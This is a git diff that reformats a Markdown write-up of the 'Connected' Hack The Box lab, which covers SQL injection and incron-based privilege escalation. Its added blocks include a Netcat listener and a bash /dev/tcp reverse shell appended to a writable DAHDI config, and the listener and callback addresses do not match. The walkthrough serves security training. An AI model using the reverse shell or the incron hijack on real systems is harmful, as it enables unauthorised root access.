@@ -1,4 +1,4 @@
-# Connected-Hack-The-Box-Writeup
+# Connected - Hack The Box Writeup
 ![Status](https://img.shields.io/badge/Status-Complete-brightgreen)
 ![Hack The Box](https://img.shields.io/badge/Hack%20The%20Box-Connected-9FEF00?logo=hackthebox&logoColor=black)
 ![SQL Injection](https://img.shields.io/badge/SQL%20Injection-Initial%20Access-red)
@@ -118,7 +118,7 @@ python -c 'import pty; pty.spawn("/bin/bash")'
 [asterisk@connected ~]$ 
 ```
 
-The module failed to properly sanitize the caller ID name before inserting it into the database, allowing an attacker to inject arbitrary SQL queries. This vulnerability could ultimately be leveraged to obtain administrative access and achieve remote code execution.
+> The module failed to properly sanitize the caller ID name before inserting it into the database, allowing an attacker to inject arbitrary SQL queries. This vulnerability could ultimately be leveraged to obtain administrative access and achieve remote code execution.
 
 
 
@@ -252,13 +252,26 @@ With the AMI route ruled out, I revisited the filesystem looking for files and p
 
 The most common privilege escalation opportunities I considered were:
 
-Sudo misconfigurations — NOPASSWD rules or overly permissive commands
-SUID/SGID binaries — executables running with elevated privileges
-Writable cron/incron jobs — privileged automation triggered by attacker-controlled files
-PATH hijacking — privileged scripts executing attacker-controlled binaries
-Writable configuration files — configuration sourced or executed by privileged processes
+- [ ] **Sudo Misconfigurations** — `NOPASSWD` rules or overly permissive commands
+- [ ] **SUID/SGID Binaries** — Executables running with elevated privileges
+- [ ] **Writable Cron/Incron Jobs** — Privileged automation triggered by attacker-controlled files
+- [ ] **PATH Hijacking** — Privileged scripts executing attacker-controlled binaries
+- [ ] **Writable Configuration Files** — Configuration files sourced or executed by privileged processes
 
 During this enumeration, I discovered that incrond was monitoring files that the asterisk user could write to.
+
+```bash
+cat /etc/incron.d/*
+/var/spool/asterisk/sysadmin/vpnget IN_CLOSE_WRITE /usr/sbin/sysadmin_openvpn -d
+/var/spool/asterisk/sysadmin/intrusion_detection_stop IN_CLOSE_WRITE /etc/init.d/fail2ban stop
+/var/spool/asterisk/sysadmin/update_system_cron IN_CLOSE_WRITE /usr/sbin/sysadmin_update_set_cron
+/var/spool/asterisk/sysadmin/portmgmt_setup IN_CLOSE_WRITE /usr/sbin/sysadmin_portmgmt
+/var/spool/asterisk/sysadmin/wanrouter_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_wanrouter_restart
+**/var/spool/asterisk/sysadmin/dahdi_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_dahdi_restart**
+/usr/local/asterisk/ha_trigger IN_CLOSE_WRITE /usr/sbin/sysadmin_ha
+/usr/local/asterisk/incron IN_CLOSE_WRITE /usr/bin/sysadmin_manager -- local $#
+/var/spool/asterisk/incron IN_MODIFY, IN_ATTRIB, IN_CLOSE_WRITE /usr/bin/sysadmin_manager $#
+```
 
 ## Incron Enumeration
 
@@ -308,15 +321,25 @@ This transformed the writable configuration file into a root-level code executio
 
 I first set up a Netcat listener on my attacking machine.
 
-nc -lvnp <PORT>
+```bash
+┌─[us-dedivip-3]─[10.10.14.27]─[bchaney@htb-muoevhb2ih]─[~]
+└──╼ [★]$ nc -lvnp 4445
+Listening on 0.0.0.0 4445
+```
 
 I then appended a reverse shell command to the writable DAHDI configuration file.
+
+```bash
+echo "bash -c 'bash -i >& /dev/tcp/10.10.14.5/4545 0>&1'" | tee -a init.conf
+```
 
 [Insert screenshot]
 
 Finally, I triggered the incron rule by writing to the monitored file:
 
+```bash
 echo "restart" > /var/spool/asterisk/sysadmin/dahdi_restart
+```
 
 Writing and closing the file generated the required IN_CLOSE_WRITE event.
 
@@ -336,7 +359,9 @@ reverse shell
 
 The reverse shell connected back to my attacking machine with root privileges.
 
-[Insert screenshot showing id / uid=0(root)]
+```bash
+[root@connected root]# cat root.txt
+```
 
 I had successfully escalated from the asterisk user to root.
 
